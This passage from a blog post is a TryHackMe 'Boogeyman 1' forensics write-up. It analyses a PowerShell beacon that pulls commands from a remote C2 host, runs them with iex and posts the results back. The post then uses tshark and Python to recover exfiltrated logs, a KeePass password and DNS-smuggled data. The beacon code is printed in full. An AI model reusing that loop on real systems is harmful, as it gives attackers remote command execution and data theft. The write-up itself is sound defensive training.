class="nt">-Body</span><span class="w"> </span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$e</span><span class="o">+</span><span class="nv">$r</span><span class="p">)</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">' '</span><span class="p">)}</span><span class="w"> </span><span class="n">sleep</span><span class="w"> </span><span class="nx">0.8</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This command enters an infinite loop to periodically check for commands from the remote server.</p><dl><dt>Retrieve Commands<dd>Queries the URL <code class="language-plaintext highlighter-rouge">http://cdn.bpakcaging.xyz:8080/b86459bb</code> with the custom header <code class="language-plaintext highlighter-rouge">X-38d2-8f49</code>, likely expecting command instructions from the server. The returned content is stored in <code class="language-plaintext highlighter-rouge">$c</code>.<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/b86459bb</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="s2">"X-38d2-8f49"</span><span class="o">=</span><span class="nv">$i</span><span class="p">})</span><span class="o">.</span><span class="nf">Content</span><span class="w">
</span></pre></table></code></div></div><dt>Execute Commands<dd>If <code class="language-plaintext highlighter-rouge">$c</code> is not equal to <code class="language-plaintext highlighter-rouge">None</code>, it interprets <code class="language-plaintext highlighter-rouge">$c</code> as a command and executes it using <code class="language-plaintext highlighter-rouge">iex (Invoke-Expression)</code>. <code class="language-plaintext highlighter-rouge">iex</code> runs the string <code class="language-plaintext highlighter-rouge">$c</code> as PowerShell code, which can execute arbitrary commands received from the remote server. <code class="language-plaintext highlighter-rouge">-ErrorAction Stop</code> is used to halt on errors, and errors are stored in <code class="language-plaintext highlighter-rouge">$e</code>.</dl><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$c</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s1">'None'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iex</span><span class="w"> </span><span class="nv">$c</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w"> </span><span class="nt">-ErrorVariable</span><span class="w"> </span><span class="nx">e</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><dl><dt>Send Results Back to Server<dd>Converts the result of the executed command to a string (<code class="language-plaintext highlighter-rouge">Out-String -InputObject $r</code>). Sends the output and any errors (<code class="language-plaintext highlighter-rouge">$e + $r</code>) back to the server at <code class="language-plaintext highlighter-rouge">http://cdn.bpakcaging.xyz:8080/27fe2489</code> via a POST request. This also uses the custom header <code class="language-plaintext highlighter-rouge">X-38d2-8f49</code> for session identification.</dl><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$r</span><span class="w">
</span><span class="nv">$t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/27fe2489</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="s2">"X-38d2-8f49"</span><span class="o">=</span><span class="nv">$i</span><span class="p">}</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$e</span><span class="o">+</span><span class="nv">$r</span><span class="p">)</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">' '</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Now, to find the password of the exfiltrated file, we need to look out for the output of <code class="language-plaintext highlighter-rouge">sq3.exe</code> execution in the capture file. As requests made to <code class="language-plaintext highlighter-rouge">/27fe2489</code> contain commands output (encoded), we will reconstruct these logs as follows:</p><ol><li>Export all HTTP objects from the capture file<li>Assemble all objects related to <code class="language-plaintext highlighter-rouge">/27fe2489</code> into a single file<li>Decode the resulting file and access the logs</ol><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>tshark <span class="nt">-r</span> capture.pcapng <span class="nt">--export-objects</span> http,here <span class="nt">-q</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">cd </span>here
<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>27fe2489<span class="k">*</span> | <span class="nb">sed</span> <span class="s1">'s/OK/ /g'</span> <span class="o">&gt;</span> commands.txt
<span class="gp">$</span><span class="w"> </span>python3 ascii_conv.py <span class="o">&gt;</span> commands_log.txt
</pre></table></code></div></div><p>We use a python script to convert ASCII to readable strings</p><div file="ascii_conv.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="ascii_conv.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">ascii_to_text</span><span class="p">(</span><span class="n">ascii_codes</span><span class="p">):</span>
    <span class="n">text</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">ascii_codes</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">text</span>

<span class="k">def</span> <span class="nf">read_ascii_from_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="n">ascii_codes</span> <span class="o">=</span> <span class="p">[</span><span class="nf">int</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">split</span><span class="p">()]</span>
    <span class="k">return</span> <span class="n">ascii_codes</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">file_path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">commands.txt</span><span class="sh">'</span>
    <span class="n">ascii_codes</span> <span class="o">=</span> <span class="nf">read_ascii_from_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
    <span class="n">logs</span> <span class="o">=</span> <span class="nf">ascii_to_text</span><span class="p">(</span><span class="n">ascii_codes</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">logs</span><span class="p">)</span>
</pre></table></code></div></div><p>Examining the log file, we find the target password <kbd>%p9^3!lL^Mz47E2GaT^y</kbd></p><div file="commands_log.txt" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="commands_log.txt"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>...SNIP...
The term '.\sq3.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. 
Path               
----               
C:\Users\j.westcott

\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y|ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#1&amp;31c5ecd4&amp;0&amp;UID256#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=1106,43;Size=320,320|1|0||Yellow|0||||||0||8ca22c0e-ba5e-499a-a86c-7473a53dc6de|74f08724-ccc9-4ce6-94e7-8c99e6cd42c6|638092247397199589||638092247516107079

Path               
----               
C:\Users\j.westcott
...SNIP...
</pre></table></code></div></div><p>The last step in this investigation is to extract smuggled data. We already explained how this works so we’ll proceed directly to extracting hexadecimal encoded lines from the capture file.</p><p>We used a Tshark filter that allows us to remove redundent and/or non interesting queries, then extracted the hex sub-strings from the queried domains:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>tshark <span class="nt">-r</span> capture.pcapng <span class="nt">-T</span> fields <span class="nt">-e</span> dns.qry.name <span class="nt">-Y</span> <span class="s1">'ip.dst == 167.71.211.113 &amp;&amp; dns.qry.type == 1 &amp;&amp; !(dns.qry.name matches \".*bpakcaging.xyz.\")'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"."</span> <span class="nt">-f</span> 1 <span class="o">&gt;</span> hexlines.txt
<span class="gp">$</span><span class="w"> </span>python3 hex_to_kdbx.py
</pre></table></code></div></div><p>Here again, we use a python script to convert hexadecimal to binary.</p><div file="hex_to_kdbx.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="hex_to_kdbx.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">hex_to_binary</span><span class="p">(</span><span class="n">hex_string</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">binary_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">binary_data</span>
    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">process_hex_file</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">,</span> <span class="nf">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">infile</span><span class="p">:</span>
            <span class="n">hex_string</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
            <span class="n">binary_result</span> <span class="o">=</span> <span class="nf">hex_to_binary</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">binary_result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">outfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">binary_result</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error converting line: </span><span class="si">{</span><span class="n">hex_string</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">input_file</span> <span class="o">=</span> <span class="sh">'</span><span class="s">hex_lines.txt</span><span class="sh">'</span>
    <span class="n">output_file</span> <span class="o">=</span> <span class="sh">'</span><span class="s">protected_data.kdbx</span><span class="sh">'</span>
    <span class="nf">process_hex_file</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">)</span>
</pre></table></code></div></div><p>Once done, we can open keepass to check the content of our file.</p><p><a href="/assets/img/boogeyman/image-3.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/image-3.png" alt="alt text" loading="lazy"></a> <em>Launch KeePass and open the target file</em></p><p><a href="/assets/img/boogeyman/image-4.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/image-4.png" alt="alt text" loading="lazy"></a> <em>Supply the password</em></p><p><a href="/assets/img/boogeyman/image-5.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/image-5.png" alt="alt text" loading="lazy"></a> <em>Extract data</em></p><p>The bank account with the number <kbd>4024007128269551</kbd> is now compromised, the bank has to be notified to block fraudulent activities.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/ctf-writeups/">CTF Writeups</a>, <a href="/blog/tryhackme/">TryHackMe</a>, <a href="/blog/soc-1/">SOC 1</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/dfir/" class="post-tag no-text-decoration" >DFIR</a> <a href="/tags/phishing/" class="post-tag no-text-decoration" >Phishing</a> <a href="/tags/wireshark/" class="post-tag no-text-decoration" >Wireshark</a> <a href="/tags/tshark/" class="post-tag no-text-decoration" >Tshark</a> <a href="/tags/dns-smuggling/" class="post-tag no-text-decoration" >DNS smuggling</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Boogeyman%201%20-%20Ibrahim%20EO.&url=%2Fposts%2Fboogyman%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Boogeyman%201%20-%20Ibrahim%20EO.&u=%2Fposts%2Fboogyman%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fboogyman%2F&text=Boogeyman%201%20-%20Ibrahim%20EO." target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/boogyman/">Boogeyman 1</a><li class="text-truncate lh-lg"> <a href="/posts/boogeyman-2/">Boogeyman 2</a><li class="text-truncate lh-lg"> <a href="/posts/itsy-bitsy/">ItsyBitsy</a><li class="text-truncate lh-lg"> <a href="/posts/benign/">Benign</a><li class="text-truncate lh-lg"> <a href="/posts/overpass-2-hacked/">Overpass 2 Hacked</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/apache2/">Apache2</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">AWS</a> <a class="post-tag btn btn-outline-primary" href="/tags/binwalk/">binwalk</a> <a class="post-tag btn btn-outline-primary" href="/tags/borg/">borg</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/boogeyman-2/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1730761200" data-df="ll" > Nov 5, 2024 </time><h4 class="pt-0 my-2">Boogeyman 2</h4><div class="text-muted"><p>The Boogeyman is back. Are you still afraid of the Boogeyman?</p></div></div></a></article><article class="col"> <a href="/posts/benign/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1730070000" data-df="ll" > Oct 28, 2024 </time><h4 class="pt-0 my-2">Benign</h4><div class="text-muted"><p>Challenge room to investigate a compromised host using Splunk.</p></div></div></a></article><article class="col"> <a href="/posts/itsy-bitsy/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1729893600" data-df="ll" > Oct 26, 2024 </time><h4 class="pt-0 my-2">ItsyBitsy</h4><div class="text-muted"><p>Put your ELK knowledge together and investigate an incident.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/benign/" class="btn btn-outline-primary" aria-label="Older" ><p>Benign</p></a> <a href="/posts/boogeyman-2/" class="btn btn-outline-primary" aria-label="Newer" ><p>Boogeyman 2</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://github.com/elomarii">Ibrahim El Omari</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.0.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/apache2/">Apache2</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">AWS</a> <a class="post-tag btn btn-outline-primary" href="/tags/binwalk/">binwalk</a> <a class="post-tag btn btn-outline-primary" href="/tags/borg/">borg</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
